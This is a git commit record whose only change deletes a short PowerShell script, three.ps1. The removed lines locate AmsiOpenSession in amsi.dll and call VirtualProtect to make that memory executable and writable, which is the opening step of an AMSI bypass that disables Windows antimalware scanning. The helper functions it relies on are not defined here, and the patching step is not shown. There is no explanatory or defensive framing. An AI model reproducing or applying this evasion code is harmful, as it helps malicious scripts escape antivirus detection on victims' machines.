0730b1206c196854d109c3c706927ca794532fcf
HeeresS <48584256+HeeresS@users.noreply.github.com>
2024-05-02 10:05:59 +0200

    Delete three.ps1

--- three.ps1
+++
@@ -1,6 +0,0 @@
-[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
-$oldProtect = 0
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
-(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-
-$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)
